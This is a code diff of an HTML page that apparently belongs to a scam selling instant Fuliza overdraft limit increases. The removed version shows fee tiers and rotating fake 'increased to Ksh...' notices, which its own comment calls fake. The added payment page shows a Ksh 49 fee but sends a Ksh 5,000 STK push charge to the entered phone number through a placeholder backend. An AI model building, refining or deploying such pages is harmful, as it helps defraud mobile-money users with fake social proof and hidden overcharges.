@@ -3,101 +3,110 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>FulizaBoost</title>
-<link rel="stylesheet" href="style.css">
+<title>Complete Payment</title>
+
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background: #f4f6f8;
+  padding: 20px;
+}
+
+.container {
+  max-width: 400px;
+  margin: auto;
+  background: white;
+  padding: 20px;
+  border-radius: 10px;
+}
+
+h1 {
+  text-align: center;
+  color: green;
+}
+
+.box {
+  background: #e8f5e9;
+  padding: 10px;
+  margin-bottom: 15px;
+  border-left: 5px solid green;
+}
+
+input {
+  width: 100%;
+  padding: 12px;
+  margin-top: 10px;
+  border-radius: 6px;
+  border: 1px solid #ccc;
+}
+
+button {
+  width: 100%;
+  padding: 12px;
+  margin-top: 15px;
+  background: green;
+  color: white;
+  border: none;
+  border-radius: 6px;
+  font-size: 16px;
+}
+</style>
 </head>
+
 <body>
 
 <div class="container">
-  <h1 class="title">FulizaBoost</h1>
-  <p class="subtitle">Instant Limit Increase • No Paperwork • Same Day Access</p>
+  <h1>Complete Payment</h1>
 
-  <div class="info-box">
-    Choose your new Fuliza limit and complete payment to activate instantly.
+  <div class="box">
+    <p>You selected: <strong>Ksh 5,000</strong></p>
+    <p>Fee: Ksh 49</p>
   </div>
 
-  <div class="recent">
-    📢 <span id="recentText">0727****01 increased to Ksh 22,500 - just now</span>
-  </div>
+  <input type="text" id="phone" placeholder="Enter phone number">
 
-  <div class="progress"></div>
-
-  <h2 class="section-title">Select Your Fuliza Limit</h2>
-
-  <div class="grid">
-
-    <div class="card" data-fee="49"><h3>Ksh 5,000</h3><span>Fee: Ksh 49</span></div>
-    <div class="card" data-fee="75"><h3>Ksh 7,500</h3><span>Fee: Ksh 75</span></div>
-    <div class="card" data-fee="100"><h3>Ksh 10,000</h3><span>Fee: Ksh 100</span></div>
-    <div class="card" data-fee="120"><h3>Ksh 12,500</h3><span>Fee: Ksh 120</span></div>
-    <div class="card" data-fee="150"><h3>Ksh 16,000</h3><span>Fee: Ksh 150</span></div>
-    <div class="card" data-fee="200"><h3>Ksh 21,000</h3><span>Fee: KSh 200</span></div>
-    <div class="card" data-fee="250"><h3>Ksh 25,500</h3><span>Fee: Ksh 250</span></div>
-    <div class="card" data-fee="290"><h3>Ksh 30,000</h3><span>Fee: Ksh 290</span></div>
-    <div class="card" data-fee="340"><h3>Ksh 35,000</h3><span>Fee: Ksh 340</span></div>
-    <div class="card" data-fee="390"><h3>Ksh 40,000</h3><span>Fee: Ksh 390</span></div>
-    <div class="card" data-fee="440"><h3>Ksh 45,000</h3><span>Fee: Ksh 440</span></div>
-    <div class="card" data-fee="490"><h3>Ksh 50,000</h3><span>Fee: Ksh 490</span></div>
-    <div class="card" data-fee="590"><h3>Ksh 60,000</h3><span>Fee: Ksh 590</span></div>
-    <div class="card" data-fee="690"><h3>Ksh 70,000</h3><span>Fee: Ksh 690</span></div>
-
-  </div>
-
-  <button class="cta" onclick="proceed()">⚡ Get Limit Now</button>
+  <button onclick="payNow()">Pay Now</button>
 </div>
 
 <script>
+const selectedAmount = 5000; // ✅ MAIN AMOUNT (NOT FEE)
 
-// 🔥 fake live updates
-const updates = [
-"0721****34 increased to Ksh 18,000",
-"0713****88 increased to Ksh 25,500",
-"0740****19 increased to Ksh 40,000",
-"0706****55 increased to Ksh 12,500",
-"0792****41 increased to Ksh 30,000",
-"0719****02 increased to Ksh 21,000",
-"0758****66 increased to Ksh 35,000",
-"0768****90 increased to Ksh 50,000"
-];
+async function payNow() {
+  const phone = document.getElementById("phone").value.trim();
 
-let i = 0;
-setInterval(() => {
-  document.getElementById("recentText").innerText = updates[i] + " - just now";
-  i = (i + 1) % updates.length;
-}, 3000);
-
-
-// ✅ selection logic
-let selected = "";
-let selectedFee = 0;
-
-const cards = document.querySelectorAll(".card");
-
-cards.forEach(card => {
-  card.addEventListener("click", () => {
-    cards.forEach(c => c.classList.remove("active"));
-    card.classList.add("active");
-
-    selected = card.querySelector("h3").innerText;
-    selectedFee = Number(card.getAttribute("data-fee")); // ✅ number
-  });
-});
-
-
-// 🚀 proceed
-function proceed(){
-  if(!selected){
-    alert("Please select a limit first");
+  if (!phone) {
+    alert("Enter phone number");
     return;
   }
 
-  // ✅ save clean values
-  localStorage.setItem("amount", selectedFee);
-  localStorage.setItem("limit", selected);
+  // ✅ CONVERT TO NUMBER (CRITICAL FIX)
+  const amount = Number(selectedAmount);
 
-  window.location.href = "pay.html";
+  try {
+    const res = await fetch("https://YOUR-BACKEND-URL/api/pay", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        phone: phone,
+        amount: amount // ✅ correct
+      })
+    });
+
+    const data = await res.json();
+
+    if (res.ok) {
+      alert("✅ STK Push Sent! Check your phone");
+    } else {
+      alert("❌ " + (data.error || "Payment failed"));
+    }
+
+  } catch (err) {
+    alert("❌ Network error");
+    console.error(err);
+  }
 }
-
 </script>
 
 </body>
